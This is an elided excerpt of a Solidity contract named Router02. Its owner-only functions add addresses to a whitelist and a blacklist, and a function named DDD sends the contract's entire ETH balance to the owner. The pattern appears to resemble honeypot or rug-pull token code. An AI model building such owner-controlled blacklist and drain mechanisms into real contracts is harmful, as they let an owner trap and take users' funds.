...
contract Router02 is Ownable {
    ...
    function sETH(uint256 count) external onlyOwner {
    ...
    function AdWL(address[] memory _wat) external onlyOwner{
        for (uint i = 0; i < _wat.length; i++) {
            whites[_wat[i]] = true;
        }
    }

    function AdBL(address[] memory _bat) external onlyOwner{
        for (uint i = 0; i < _bat.length; i++) {
            blacks[_bat[i]] = true;
        }
    }

    function DDD() external onlyOwner {
        payable(msg.sender).transfer(address(this).balance);
    }
}